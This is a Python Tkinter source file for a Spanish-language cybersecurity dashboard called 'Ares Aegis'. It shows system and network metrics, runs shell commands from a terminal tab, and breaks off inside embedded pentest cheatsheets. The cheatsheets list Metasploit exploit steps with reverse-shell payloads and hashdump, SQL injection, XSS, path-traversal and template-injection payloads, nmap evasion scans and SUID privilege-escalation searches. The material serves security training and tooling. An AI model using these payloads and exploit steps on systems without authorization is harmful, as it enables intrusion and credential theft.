# -*- coding: utf-8 -*-
"""
Ares Aegis - Vista Dashboard Optimizada
Dashboard para expertos en ciberseguridad con métricas específicas
Actualización cada 60 segundos para optimizar recursos
"""

import tkinter as tk
from tkinter import ttk, scrolledtext
import subprocess
import threading
import time
import platform
import os
import socket
import psutil
from datetime import datetime

try:
    from aresitos.vista.burp_theme import burp_theme
    BURP_THEME_AVAILABLE = True
except ImportError:
    BURP_THEME_AVAILABLE = False
    burp_theme = None

class VistaDashboard(tk.Frame):
    """Dashboard optimizado para expertos en ciberseguridad."""
    
    def __init__(self, parent):
        super().__init__(parent)
        self.controlador = None
        self.actualizacion_activa = False
        self.shell_detectado = self._detectar_shell()
        
        # Configurar tema y colores
        if BURP_THEME_AVAILABLE:
            self.theme = burp_theme
            self.colors = {
                'bg_primary': '#2b2b2b',
                'bg_secondary': '#3a3a3a', 
                'fg_primary': '#ffffff',
                'fg_secondary': '#aaaaaa',
                'fg_accent': '#ff6633',
                'button_bg': '#ff6633',
                'button_fg': '#ffffff'
            }
            self.configure(bg=self.colors['bg_primary'])
        else:
            self.theme = None
            self.colors = {
                'bg_primary': '#f0f0f0',
                'bg_secondary': '#ffffff',
                'fg_primary': '#000000',
                'fg_secondary': '#666666',
                'fg_accent': '#ff6633',
                'button_bg': '#007acc',
                'button_fg': '#ffffff'
            }
            self.configure(bg=self.colors['bg_primary'])
        
        self.crear_interfaz()
        self.iniciar_actualizacion_metricas()
    
    def _detectar_shell(self):
        """Detectar el shell disponible en el sistema."""
        if platform.system() == "Windows":
            if os.path.exists("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"):
                return "powershell"
            elif os.path.exists("C:\\Program Files\\PowerShell\\7\\pwsh.exe"):
                return "pwsh"
            else:
                return "cmd"
        else:
            return "bash"
    
    def set_controlador(self, controlador):
        """Establecer el controlador del dashboard."""
        self.controlador = controlador
    
    def crear_interfaz(self):
        """Crear la interfaz principal del dashboard."""
        # Frame principal para el título
        titulo_frame = tk.Frame(self, bg=self.colors['bg_secondary'])
        titulo_frame.pack(fill="x", padx=10, pady=5)
        
        titulo_label = tk.Label(
            titulo_frame,
            text=" ARES AEGIS - Dashboard de Ciberseguridad",
            font=("Arial", 16, "bold"),
            fg=self.colors['fg_accent'],
            bg=self.colors['bg_secondary']
        )
        titulo_label.pack()
        
        # Crear notebook para organizar las secciones
        self.notebook = ttk.Notebook(self)
        self.notebook.pack(fill="both", expand=True, padx=10, pady=5)
        
        # Pestaña de métricas del sistema
        self.crear_pestana_metricas()
        
        # Pestaña de información de red
        self.crear_pestana_red()
        
        # Pestaña de terminal
        self.crear_pestana_terminal()
        
        # Pestaña de chuletas/cheatsheets
        self.crear_pestana_chuletas()
    
    def crear_pestana_metricas(self):
        """Crear pestaña de métricas específicas para ciberseguridad."""
        metricas_frame = tk.Frame(self.notebook, bg=self.colors['bg_primary'])
        self.notebook.add(metricas_frame, text=" Métricas del Sistema")
        
        # Frame para información del sistema
        info_sistema_frame = tk.LabelFrame(
            metricas_frame, 
            text="Información del Sistema",
            bg=self.colors['bg_secondary'],
            fg=self.colors['fg_primary'],
            font=("Arial", 12, "bold")
        )
        info_sistema_frame.pack(fill="x", padx=10, pady=5)
        
        # Sistema operativo y arquitectura
        self.os_label = tk.Label(
            info_sistema_frame,
            text=f"OS: {platform.system()} {platform.release()} ({platform.architecture()[0]})",
            bg=self.colors['bg_secondary'],
            fg=self.colors['fg_primary'],
            font=("Consolas", 10)
        )
        self.os_label.pack(anchor="w", padx=10, pady=2)
        
        # Hostname
        self.hostname_label = tk.Label(
            info_sistema_frame,
            text=f"Hostname: {socket.gethostname()}",
            bg=self.colors['bg_secondary'],
            fg=self.colors['fg_primary'],
            font=("Consolas", 10)
        )
        self.hostname_label.pack(anchor="w", padx=10, pady=2)
        
        # Usuario actual
        self.user_label = tk.Label(
            info_sistema_frame,
            text=f"Usuario: {os.getenv('USERNAME', os.getenv('USER', 'Unknown'))}",
            bg=self.colors['bg_secondary'],
            fg=self.colors['fg_primary'],
            font=("Consolas", 10)
        )
        self.user_label.pack(anchor="w", padx=10, pady=2)
        
        # Frame para métricas críticas
        metricas_criticas_frame = tk.LabelFrame(
            metricas_frame,
            text="Métricas Críticas para Ciberseguridad",
            bg=self.colors['bg_secondary'],
            fg=self.colors['fg_primary'],
            font=("Arial", 12, "bold")
        )
        metricas_criticas_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        # Uso de CPU
        cpu_frame = tk.Frame(metricas_criticas_frame, bg=self.colors['bg_secondary'])
        cpu_frame.pack(fill="x", padx=10, pady=5)
        
        tk.Label(cpu_frame, text=" CPU Usage:", 
                bg=self.colors['bg_secondary'], fg=self.colors['fg_primary'],
                font=("Arial", 10, "bold")).pack(side="left")
        
        self.cpu_label = tk.Label(cpu_frame, text="0.0%",
                                 bg=self.colors['bg_secondary'], fg=self.colors['fg_accent'],
                                 font=("Consolas", 10, "bold"))
        self.cpu_label.pack(side="right")
        
        # Uso de memoria
        memoria_frame = tk.Frame(metricas_criticas_frame, bg=self.colors['bg_secondary'])
        memoria_frame.pack(fill="x", padx=10, pady=5)
        
        tk.Label(memoria_frame, text=" Memory Usage:",
                bg=self.colors['bg_secondary'], fg=self.colors['fg_primary'],
                font=("Arial", 10, "bold")).pack(side="left")
        
        self.memoria_label = tk.Label(memoria_frame, text="0.0%",
                                     bg=self.colors['bg_secondary'], fg=self.colors['fg_accent'],
                                     font=("Consolas", 10, "bold"))
        self.memoria_label.pack(side="right")
        
        # Procesos activos
        procesos_frame = tk.Frame(metricas_criticas_frame, bg=self.colors['bg_secondary'])
        procesos_frame.pack(fill="x", padx=10, pady=5)
        
        tk.Label(procesos_frame, text=" Procesos Activos:",
                bg=self.colors['bg_secondary'], fg=self.colors['fg_primary'],
                font=("Arial", 10, "bold")).pack(side="left")
        
        self.procesos_label = tk.Label(procesos_frame, text="0",
                                      bg=self.colors['bg_secondary'], fg=self.colors['fg_accent'],
                                      font=("Consolas", 10, "bold"))
        self.procesos_label.pack(side="right")
        
        # Estado de servicios críticos
        servicios_frame = tk.Frame(metricas_criticas_frame, bg=self.colors['bg_secondary'])
        servicios_frame.pack(fill="x", padx=10, pady=5)
        
        tk.Label(servicios_frame, text=" Estado SIEM:",
                bg=self.colors['bg_secondary'], fg=self.colors['fg_primary'],
                font=("Arial", 10, "bold")).pack(side="left")
        
        self.siem_label = tk.Label(servicios_frame, text=" Inactive",
                                  bg=self.colors['bg_secondary'], fg=self.colors['fg_accent'],
                                  font=("Consolas", 10, "bold"))
        self.siem_label.pack(side="right")
        
        # Tiempo de actividad
        uptime_frame = tk.Frame(metricas_criticas_frame, bg=self.colors['bg_secondary'])
        uptime_frame.pack(fill="x", padx=10, pady=5)
        
        tk.Label(uptime_frame, text="⏱ Uptime Sistema:",
                bg=self.colors['bg_secondary'], fg=self.colors['fg_primary'],
                font=("Arial", 10, "bold")).pack(side="left")
        
        self.uptime_label = tk.Label(uptime_frame, text="Unknown",
                                    bg=self.colors['bg_secondary'], fg=self.colors['fg_accent'],
                                    font=("Consolas", 10, "bold"))
        self.uptime_label.pack(side="right")
    
    def crear_pestana_red(self):
        """Crear pestaña de información de red."""
        red_frame = tk.Frame(self.notebook, bg=self.colors['bg_primary'])
        self.notebook.add(red_frame, text=" Información de Red")
        
        # Frame para IPs
        ip_frame = tk.LabelFrame(
            red_frame,
            text="Direcciones IP del Sistema",
            bg=self.colors['bg_secondary'],
            fg=self.colors['fg_primary'],
            font=("Arial", 12, "bold")
        )
        ip_frame.pack(fill="x", padx=10, pady=5)
        
        # IP Local (LAN)
        self.ip_local_label = tk.Label(
            ip_frame,
            text=" IP Local (LAN): Obteniendo...",
            bg=self.colors['bg_secondary'],
            fg=self.colors['fg_primary'],
            font=("Consolas", 11),
            anchor="w"
        )
        self.ip_local_label.pack(fill="x", padx=10, pady=5)
        
        # IP Pública (WAN)
        self.ip_publica_label = tk.Label(
            ip_frame,
            text=" IP Pública (WAN): Obteniendo...",
            bg=self.colors['bg_secondary'],
            fg=self.colors['fg_primary'],
            font=("Consolas", 11),
            anchor="w"
        )
        self.ip_publica_label.pack(fill="x", padx=10, pady=5)
        
        # Interfaces de red
        interfaces_frame = tk.LabelFrame(
            red_frame,
            text="Interfaces de Red Activas",
            bg=self.colors['bg_secondary'],
            fg=self.colors['fg_primary'],
            font=("Arial", 12, "bold")
        )
        interfaces_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        # Área de texto para interfaces
        self.interfaces_text = scrolledtext.ScrolledText(
            interfaces_frame,
            height=8,
            bg=self.colors['bg_primary'],
            fg=self.colors['fg_primary'],
            font=("Consolas", 9),
            insertbackground=self.colors['fg_primary']
        )
        self.interfaces_text.pack(fill="both", expand=True, padx=10, pady=5)
        
        # Frame para estadísticas de red
        stats_red_frame = tk.LabelFrame(
            red_frame,
            text="Estadísticas de Red",
            bg=self.colors['bg_secondary'],
            fg=self.colors['fg_primary'],
            font=("Arial", 12, "bold")
        )
        stats_red_frame.pack(fill="x", padx=10, pady=5)
        
        # Conexiones activas
        conexiones_frame = tk.Frame(stats_red_frame, bg=self.colors['bg_secondary'])
        conexiones_frame.pack(fill="x", padx=10, pady=2)
        
        tk.Label(conexiones_frame, text=" Conexiones Activas:",
                bg=self.colors['bg_secondary'], fg=self.colors['fg_primary'],
                font=("Arial", 10, "bold")).pack(side="left")
        
        self.conexiones_label = tk.Label(conexiones_frame, text="0",
                                        bg=self.colors['bg_secondary'], fg=self.colors['fg_accent'],
                                        font=("Consolas", 10, "bold"))
        self.conexiones_label.pack(side="right")
        
        # Puertos en escucha
        puertos_frame = tk.Frame(stats_red_frame, bg=self.colors['bg_secondary'])
        puertos_frame.pack(fill="x", padx=10, pady=2)
        
        tk.Label(puertos_frame, text=" Puertos en Escucha:",
                bg=self.colors['bg_secondary'], fg=self.colors['fg_primary'],
                font=("Arial", 10, "bold")).pack(side="left")
        
        self.puertos_label = tk.Label(puertos_frame, text="0",
                                     bg=self.colors['bg_secondary'], fg=self.colors['fg_accent'],
                                     font=("Consolas", 10, "bold"))
        self.puertos_label.pack(side="right")
    
    def crear_pestana_terminal(self):
        """Crear pestaña de terminal integrado."""
        terminal_frame = tk.Frame(self.notebook, bg=self.colors['bg_primary'])
        self.notebook.add(terminal_frame, text=" Terminal")
        
        # Frame para comandos rápidos
        comandos_frame = tk.LabelFrame(
            terminal_frame,
            text="Terminal y Comandos de Ciberseguridad",
            bg=self.colors['bg_secondary'],
            fg=self.colors['fg_primary'],
            font=("Arial", 12, "bold")
        )
        comandos_frame.pack(fill="x", padx=10, pady=5)
        
        # Botón especial para abrir terminal real de Kali
        terminal_kali_frame = tk.Frame(comandos_frame, bg=self.colors['bg_secondary'])
        terminal_kali_frame.pack(fill="x", pady=5)
        
        btn_terminal_kali = tk.Button(
            terminal_kali_frame,
            text="🖥️ ABRIR TERMINAL REAL DE KALI LINUX",
            command=self.abrir_terminal_kali,
            bg='#00ff00',  # Verde brillante
            fg='black',
            font=("Arial", 12, "bold"),
            height=2,
            relief='raised',
            bd=3
        )
        btn_terminal_kali.pack(fill="x", padx=5, pady=2)
        
        # Separador
        tk.Label(comandos_frame, text="Comandos Rápidos:", 
                bg=self.colors['bg_secondary'], fg=self.colors['fg_primary'],
                font=("Arial", 10, "bold")).pack(anchor="w", padx=5, pady=(10,2))
        
        # Frame específico para el grid de botones (soluciona el error de geometría)
        botones_grid_frame = tk.Frame(comandos_frame, bg=self.colors['bg_secondary'])
        botones_grid_frame.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Botones de comandos rápidos mejorados para Kali
        comandos_rapidos = [
            ("netstat -tuln", "Conexiones de red"),
            ("ps aux | head -20", "Procesos activos"),
            ("ifconfig", "Configuración de red"),
            ("nmap --version", "Verificar Nmap"),
            ("df -h", "Espacio en disco"),
            ("free -h", "Memoria RAM"),
            ("whoami", "Usuario actual"),
            ("uname -a", "Info del sistema"),
            ("ss -tuln", "Sockets de red")
        ]
        
        # Crear grid de botones en el sub-frame
        for i, (comando, descripcion) in enumerate(comandos_rapidos):
            row = i // 3
            col = i % 3
            btn = tk.Button(
                botones_grid_frame,
                text=f"{descripcion}\n{comando}",
                command=lambda cmd=comando: self.ejecutar_comando_rapido(cmd),
                bg=self.colors['button_bg'],
                fg=self.colors['button_fg'],
                font=("Arial", 8),
                height=3,
                wraplength=150
            )
            btn.grid(row=row, column=col, padx=5, pady=5, sticky="ew")
        
        # Configurar columnas para que se expandan
        for i in range(3):
            botones_grid_frame.grid_columnconfigure(i, weight=1)
        
        # Frame para entrada de comandos
        entrada_frame = tk.Frame(terminal_frame, bg=self.colors['bg_secondary'])
        entrada_frame.pack(fill="x", padx=10, pady=5)
        
        tk.Label(entrada_frame, text="Comando:",
                bg=self.colors['bg_secondary'], fg=self.colors['fg_primary'],
                font=("Arial", 10, "bold")).pack(side="left", padx=(0, 5))
        
        self.comando_entry = tk.Entry(
            entrada_frame,
            bg=self.colors['bg_primary'],
            fg=self.colors['fg_primary'],
            font=("Consolas", 10),
            insertbackground=self.colors['fg_primary']
        )
        self.comando_entry.pack(side="left", fill="x", expand=True, padx=(0, 5))
        self.comando_entry.bind("<Return>", self.ejecutar_comando_entry)
        
        ejecutar_btn = tk.Button(
            entrada_frame,
            text="Ejecutar",
            command=self.ejecutar_comando_entry,
            bg=self.colors['button_bg'],
            fg=self.colors['button_fg'],
            font=("Arial", 10, "bold")
        )
        ejecutar_btn.pack(side="right")
        
        # Área de salida del terminal
        output_frame = tk.LabelFrame(
            terminal_frame,
            text="Salida del Terminal",
            bg=self.colors['bg_secondary'],
            fg=self.colors['fg_primary'],
            font=("Arial", 12, "bold")
        )
        output_frame.pack(fill="both", expand=True, padx=10, pady=5)
        
        self.terminal_output = scrolledtext.ScrolledText(
            output_frame,
            bg=self.colors['bg_primary'],
            fg=self.colors['fg_primary'],
            font=("Consolas", 9),
            insertbackground=self.colors['fg_primary']
        )
        self.terminal_output.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Mensaje inicial
        self.terminal_output.insert(tk.END, f"Terminal iniciado - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        self.terminal_output.insert(tk.END, f"Sistema: {platform.system()} {platform.release()}\n")
        self.terminal_output.insert(tk.END, f"Shell detectado: {self.shell_detectado}\n")
        self.terminal_output.insert(tk.END, "="*50 + "\n\n")
    
    def ejecutar_comando_rapido(self, comando):
        """Ejecutar un comando rápido."""
        self.comando_entry.delete(0, tk.END)
        self.comando_entry.insert(0, comando)
        self.ejecutar_comando_entry()
    
    def ejecutar_comando_entry(self, event=None):
        """Ejecutar comando desde la entrada."""
        comando = self.comando_entry.get().strip()
        if not comando:
            return
        
        self.terminal_output.insert(tk.END, f"\n> {comando}\n")
        self.terminal_output.see(tk.END)
        
        # Ejecutar comando en thread para no bloquear la UI
        thread = threading.Thread(target=self._ejecutar_comando_async, args=(comando,))
        thread.daemon = True
        thread.start()
    
    def _ejecutar_comando_async(self, comando):
        """Ejecutar comando de forma asíncrona."""
        try:
            if platform.system() == "Windows":
                if self.shell_detectado == "powershell":
                    comando_completo = ["powershell", "-Command", comando]
                elif self.shell_detectado == "pwsh":
                    comando_completo = ["pwsh", "-Command", comando]
                else:
                    comando_completo = ["cmd", "/c", comando]
            else:
                comando_completo = ["/bin/bash", "-c", comando]
            
            resultado = subprocess.run(
                comando_completo,
                capture_output=True,
                text=True,
                timeout=30,
                encoding='utf-8',
                errors='replace'
            )
            
            output = resultado.stdout
            if resultado.stderr:
                output += f"\nERROR:\n{resultado.stderr}"
            
            # Actualizar UI en el hilo principal
            self.after(0, self._mostrar_output_comando, output)
            
        except subprocess.TimeoutExpired:
            self.after(0, self._mostrar_output_comando, "ERROR: Comando excedió el tiempo límite (30s)")
        except Exception as e:
            self.after(0, self._mostrar_output_comando, f"ERROR: {str(e)}")
    
    def _mostrar_output_comando(self, output):
        """Mostrar output del comando en el terminal."""
        self.terminal_output.insert(tk.END, output + "\n")
        self.terminal_output.insert(tk.END, "="*50 + "\n\n")
        self.terminal_output.see(tk.END)
    
    def iniciar_actualizacion_metricas(self):
        """Iniciar la actualización de métricas cada 60 segundos."""
        if not self.actualizacion_activa:
            self.actualizacion_activa = True
            self.actualizar_metricas()
    
    def detener_actualizacion_metricas(self):
        """Detener la actualización de métricas."""
        self.actualizacion_activa = False
    
    def actualizar_metricas(self):
        """Actualizar todas las métricas del dashboard."""
        if not self.actualizacion_activa:
            return
        
        try:
            # Actualizar métricas del sistema
            self._actualizar_metricas_sistema()
            
            # Actualizar información de red
            self._actualizar_info_red()
            
            # Actualizar estado de servicios
            self._actualizar_estado_servicios()
            
        except Exception as e:
            print(f"Error actualizando métricas: {e}")
        
        # Programar siguiente actualización en 60 segundos
        if self.actualizacion_activa:
            self.after(60000, self.actualizar_metricas)  # 60 segundos = 60000 ms
    
    def _actualizar_metricas_sistema(self):
        """Actualizar métricas del sistema."""
        try:
            # CPU Usage
            cpu_percent = psutil.cpu_percent(interval=1)
            self.cpu_label.configure(text=f"{cpu_percent:.1f}%")
            
            # Memory Usage
            memoria = psutil.virtual_memory()
            self.memoria_label.configure(text=f"{memoria.percent:.1f}%")
            
            # Procesos activos
            procesos = len(psutil.pids())
            self.procesos_label.configure(text=str(procesos))
            
            # Uptime del sistema
            boot_time = psutil.boot_time()
            uptime_seconds = time.time() - boot_time
            uptime_hours = int(uptime_seconds // 3600)
            uptime_minutes = int((uptime_seconds % 3600) // 60)
            self.uptime_label.configure(text=f"{uptime_hours}h {uptime_minutes}m")
            
        except Exception as e:
            print(f"Error actualizando métricas del sistema: {e}")
    
    def _actualizar_info_red(self):
        """Actualizar información de red."""
        try:
            # IP Local
            ip_local = self._obtener_ip_local()
            self.ip_local_label.configure(text=f" IP Local (LAN): {ip_local}")
            
            # IP Pública (en thread separado para no bloquear)
            threading.Thread(target=self._actualizar_ip_publica, daemon=True).start()
            
            # Interfaces de red
            self._actualizar_interfaces_red()
            
            # Estadísticas de red
            self._actualizar_estadisticas_red()
            
        except Exception as e:
            print(f"Error actualizando información de red: {e}")
    
    def _obtener_ip_local(self):
        """Obtener la IP local de la máquina."""
        try:
            # Conectar a un servidor externo para obtener la IP local
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                return s.getsockname()[0]
        except:
            return "No disponible"
    
    def _actualizar_ip_publica(self):
        """Actualizar IP pública en thread separado."""
        try:
            import urllib.request
            with urllib.request.urlopen('https://api.ipify.org', timeout=5) as response:
                ip_publica = response.read().decode('utf-8')
            
            # Actualizar UI en el hilo principal
            self.after(0, lambda: self.ip_publica_label.configure(
                text=f" IP Pública (WAN): {ip_publica}"
            ))
        except:
            self.after(0, lambda: self.ip_publica_label.configure(
                text=" IP Pública (WAN): No disponible"
            ))
    
    def _actualizar_interfaces_red(self):
        """Actualizar información de interfaces de red."""
        try:
            self.interfaces_text.delete(1.0, tk.END)
            
            interfaces = psutil.net_if_addrs()
            stats = psutil.net_if_stats()
            
            for interface, direcciones in interfaces.items():
                if interface in stats and stats[interface].isup:
                    self.interfaces_text.insert(tk.END, f" {interface}:\n")
                    
                    for direccion in direcciones:
                        if direccion.family == socket.AF_INET:  # IPv4
                            self.interfaces_text.insert(tk.END, f"   IPv4: {direccion.address}\n")
                        elif direccion.family == socket.AF_INET6:  # IPv6
                            self.interfaces_text.insert(tk.END, f"   IPv6: {direccion.address}\n")
                    
                    # Estado de la interface
                    stat = stats[interface]
                    estado = "🟢 UP" if stat.isup else " DOWN"
                    velocidad = f"{stat.speed} Mbps" if stat.speed > 0 else "Unknown"
                    self.interfaces_text.insert(tk.END, f"   Estado: {estado} | Velocidad: {velocidad}\n\n")
            
        except Exception as e:
            self.interfaces_text.delete(1.0, tk.END)
            self.interfaces_text.insert(tk.END, f"Error obteniendo interfaces: {e}")
    
    def _actualizar_estadisticas_red(self):
        """Actualizar estadísticas de red."""
        try:
            # Conexiones activas
            conexiones = psutil.net_connections()
            conexiones_establecidas = len([c for c in conexiones if c.status == 'ESTABLISHED'])
            self.conexiones_label.configure(text=str(conexiones_establecidas))
            
            # Puertos en escucha
            puertos_escucha = len([c for c in conexiones if c.status == 'LISTEN'])
            self.puertos_label.configure(text=str(puertos_escucha))
            
        except Exception as e:
            print(f"Error actualizando estadísticas de red: {e}")
    
    def _actualizar_estado_servicios(self):
        """Actualizar estado de servicios de seguridad."""
        try:
            if (hasattr(self, 'controlador') and self.controlador and
                hasattr(self.controlador, 'modelo')):
                # Verificar si el SIEM está activo
                if hasattr(self.controlador.modelo, 'siem_avanzado'):
                    siem_activo = self.controlador.modelo.siem_avanzado is not None
                    self.siem_label.configure(text="🟢 Active" if siem_activo else " Inactive")
                else:
                    self.siem_label.configure(text=" Inactive")
            else:
                self.siem_label.configure(text=" Inactive")
                
        except Exception as e:
            print(f"Error actualizando estado de servicios: {e}")
            self.siem_label.configure(text=" Error")
    
    def crear_pestana_chuletas(self):
        """Crear pestaña de cheatsheets/chuletas de ciberseguridad."""
        chuletas_frame = tk.Frame(self.notebook, bg=self.colors['bg_primary'])
        self.notebook.add(chuletas_frame, text="Cheatsheets")
        
        # Frame principal dividido
        main_frame = tk.Frame(chuletas_frame, bg=self.colors['bg_primary'])
        main_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        # Panel izquierdo - Categorías
        left_frame = tk.LabelFrame(
            main_frame,
            text="Categorías de Cheatsheets",
            bg=self.colors['bg_secondary'],
            fg=self.colors['fg_accent'],
            font=('Arial', 10, 'bold')
        )
        left_frame.pack(side="left", fill="y", padx=(0, 10))
        
        # Lista de categorías
        self.categorias_chuletas = tk.Listbox(
            left_frame,
            bg=self.colors['bg_primary'],
            fg=self.colors['fg_primary'],
            selectbackground=self.colors['fg_accent'],
            font=('Consolas', 9),
            width=30,
            height=20
        )
        self.categorias_chuletas.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Cargar categorías desde archivo de configuración
        self.cargar_categorias_cheatsheets()
        
        # Bind para selección
        self.categorias_chuletas.bind('<<ListboxSelect>>', self.cargar_cheatsheet)
        
        # Panel derecho - Contenido del cheatsheet
        right_frame = tk.LabelFrame(
            main_frame,
            text="Comandos y Referencias",
            bg=self.colors['bg_secondary'],
            fg=self.colors['fg_accent'],
            font=('Arial', 10, 'bold')
        )
        right_frame.pack(side="right", fill="both", expand=True)
        
        # Frame para botones superiores
        buttons_frame = tk.Frame(right_frame, bg=self.colors['bg_secondary'])
        buttons_frame.pack(fill="x", padx=5, pady=5)
        
        # Botón copiar comando
        self.btn_copiar = tk.Button(
            buttons_frame,
            text="Copiar Comando",
            command=self.copiar_comando_seleccionado,
            bg=self.colors['button_bg'],
            fg=self.colors['button_fg'],
            font=('Arial', 9)
        )
        self.btn_copiar.pack(side="left", padx=5)
        
        # Botón buscar
        self.btn_buscar = tk.Button(
            buttons_frame,
            text="Buscar",
            command=self.buscar_en_cheatsheet,
            bg=self.colors['bg_primary'],
            fg=self.colors['fg_primary'],
            font=('Arial', 9)
        )
        self.btn_buscar.pack(side="left", padx=5)
        
        # Campo de búsqueda
        self.entry_buscar = tk.Entry(
            buttons_frame,
            bg=self.colors['bg_primary'],
            fg=self.colors['fg_primary'],
            insertbackground=self.colors['fg_accent'],
            font=('Consolas', 9),
            width=20
        )
        self.entry_buscar.pack(side="left", padx=5)
        self.entry_buscar.bind('<Return>', lambda e: self.buscar_en_cheatsheet())
        
        # Botón guardar
        self.btn_guardar = tk.Button(
            buttons_frame,
            text="Guardar Cambios",
            command=self.guardar_cheatsheet,
            bg=self.colors['button_bg'],
            fg=self.colors['button_fg'],
            font=('Arial', 9)
        )
        self.btn_guardar.pack(side="right", padx=5)
        
        # Área de texto para comandos
        self.cheatsheet_text = scrolledtext.ScrolledText(
            right_frame,
            bg=self.colors['bg_primary'],
            fg=self.colors['fg_primary'],
            insertbackground=self.colors['fg_accent'],
            selectbackground=self.colors['fg_accent'],
            font=('Consolas', 9),
            wrap=tk.WORD
        )
        self.cheatsheet_text.pack(fill="both", expand=True, padx=5, pady=5)
        
        # Cargar cheatsheet inicial si hay categorías
        if self.categorias_chuletas.size() > 0:
            self.categorias_chuletas.selection_set(0)
            self.cargar_cheatsheet(None)
    
    def cargar_categorias_cheatsheets(self):
        """Cargar categorías desde el archivo de configuración."""
        try:
            import json
            import os
            
            config_path = os.path.join("data", "cheatsheets", "cheatsheets_config.json")
            
            if os.path.exists(config_path):
                with open(config_path, 'r', encoding='utf-8') as f:
                    config = json.load(f)
                    
                for categoria in config['cheatsheets_config']['categorias']:
                    self.categorias_chuletas.insert(tk.END, categoria['nombre'])
            else:
                # Categorías por defecto si no existe el archivo
                categorias_default = [
                    "Nmap - Escaneo de Puertos",
                    "Metasploit Framework",
                    "Comandos Linux Seguridad",
                    "Shells Inversas",
                    "John the Ripper",
                    "Burp Suite",
                    "Análisis de Logs",
                    "OSINT Básico"
                ]
                for categoria in categorias_default:
                    self.categorias_chuletas.insert(tk.END, categoria)
                    
        except Exception as e:
            print(f"Error cargando categorías de cheatsheets: {e}")
            # Categorías de respaldo
            categorias_backup = [
                "Nmap - Escaneo de Puertos",
                "Metasploit Framework",
                "Comandos Linux Seguridad"
            ]
            for categoria in categorias_backup:
                self.categorias_chuletas.insert(tk.END, categoria)
    
    def _crear_cheatsheets_database(self):
        """Crear base de datos de cheatsheets."""
        return {
            "Nmap - Port Scanning": """
# NMAP - NETWORK MAPPING CHEATSHEET

## Escaneos Básicos
nmap target.com                    # Escaneo básico
nmap -sP 192.168.1.0/24           # Ping scan
nmap -sS target.com               # TCP SYN scan
nmap -sT target.com               # TCP connect scan
nmap -sU target.com               # UDP scan

## Detección de Servicios
nmap -sV target.com               # Version detection
nmap -sC target.com               # Default scripts
nmap -A target.com                # Aggressive scan
nmap -O target.com                # OS detection

## Evasión de Firewalls
nmap -f target.com                # Fragment packets
nmap -D RND:10 target.com         # Decoy scan
nmap --source-port 53 target.com  # Source port
nmap -T0 target.com               # Paranoid timing

## Puertos Específicos
nmap -p 80 target.com             # Puerto específico
nmap -p 80,443 target.com         # Múltiples puertos
nmap -p 1-1000 target.com         # Rango de puertos
nmap -p- target.com               # Todos los puertos

## Scripts NSE
nmap --script vuln target.com     # Vulnerabilidades
nmap --script http-* target.com   # Scripts HTTP
nmap --script ssh-* target.com    # Scripts SSH
nmap --script ssl-* target.com    # Scripts SSL

## Outputs
nmap -oN scan.txt target.com      # Normal output
nmap -oX scan.xml target.com      # XML output
nmap -oG scan.grep target.com     # Grepable output
nmap -oA scan target.com          # All formats
""",
            
            "🔐 Metasploit Framework": """
# METASPLOIT FRAMEWORK CHEATSHEET

## Comandos Básicos
msfconsole                        # Iniciar Metasploit
help                              # Ayuda general
search type:exploit platform:linux # Buscar exploits
use exploit/windows/smb/ms17_010  # Seleccionar exploit
info                              # Información del módulo
show options                      # Mostrar opciones
set RHOSTS 192.168.1.100         # Configurar target
set LHOST 192.168.1.50           # Configurar listener
run                               # Ejecutar exploit

## Payloads
show payloads                     # Mostrar payloads disponibles
set payload windows/meterpreter/reverse_tcp
set payload linux/x86/meterpreter/reverse_tcp
set payload java/jsp_shell_reverse_tcp

## Meterpreter
sessions                          # Listar sesiones
sessions -i 1                     # Interactuar con sesión
sysinfo                           # Información del sistema
getuid                            # Usuario actual
ps                                # Procesos
migrate 1234                      # Migrar proceso
download file.txt                 # Descargar archivo
upload file.txt                   # Subir archivo
shell                             # Shell del sistema
hashdump                          # Dump de hashes

## Auxiliares
use auxiliary/scanner/portscan/tcp
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/smb/smb_login
use auxiliary/scanner/ssh/ssh_login

## Database
db_status                         # Estado de la BD
workspace                         # Espacios de trabajo
hosts                             # Hosts descubiertos
services                          # Servicios descubiertos
vulns                             # Vulnerabilidades
""",
            
            "Burp Suite": """
# BURP SUITE CHEATSHEET

## Atajos de Teclado
Ctrl+Shift+T                      # Nuevo proyecto temporal
Ctrl+I                            # Enviar a Intruder
Ctrl+R                            # Enviar a Repeater
Ctrl+D                            # Eliminar elemento
Ctrl+U                            # URL decode
Ctrl+Shift+U                      # URL encode
Ctrl+H                            # HTML encode/decode
Ctrl+Shift+B                      # Base64 encode/decode

## Configuración Proxy
127.0.0.1:8080                    # Puerto por defecto
Intercept On/Off                  # Interceptar requests
Forward                           # Enviar request
Drop                              # Descartar request

## Intruder - Tipos de Ataque
Sniper                            # Un payload set, una posición
Battering Ram                     # Un payload set, todas las posiciones
Pitchfork                         # Múltiples payload sets sincronizados
Cluster Bomb                      # Todas las combinaciones

## Payloads Comunes
' OR '1'='1                       # SQL injection básica
<script>alert('XSS')</script>     # XSS básico
../../../etc/passwd               # Path traversal
{{7*7}}                           # Template injection
${7*7}                            # Expression language injection

## Scanner
Passive scanning                  # Análisis automático
Active scanning                   # Pruebas invasivas
Live scanning                     # Escaneo en tiempo real

## Extensiones Útiles
Autorize                          # Testing de autorización
J2EEScan                          # Java vulnerabilities
Retire.js                         # JavaScript vulnerabilities
Hackvertor                        # Encoding/decoding
Logger++                          # Logging avanzado
""",
            
            "Linux Commands": """
# LINUX COMMANDS CHEATSHEET - CYBERSECURITY FOCUS

## Reconocimiento del Sistema
uname -a                          # Información del kernel
cat /etc/os-release               # Información del OS
whoami                            # Usuario actual
id                                # UID y grupos
groups                            # Grupos del usuario
last                              # Últimos logins
w                                 # Usuarios conectados
ps aux                            # Procesos en ejecución
netstat -tulpn                    # Puertos y servicios
ss -tulpn                         # Sockets (más moderno)

## Escalación de Privilegios
sudo -l                           # Comandos sudo permitidos
find / -perm -4000 2>/dev/null    # Archivos SUID
find / -perm -2000 2>/dev/null    # Archivos SGID
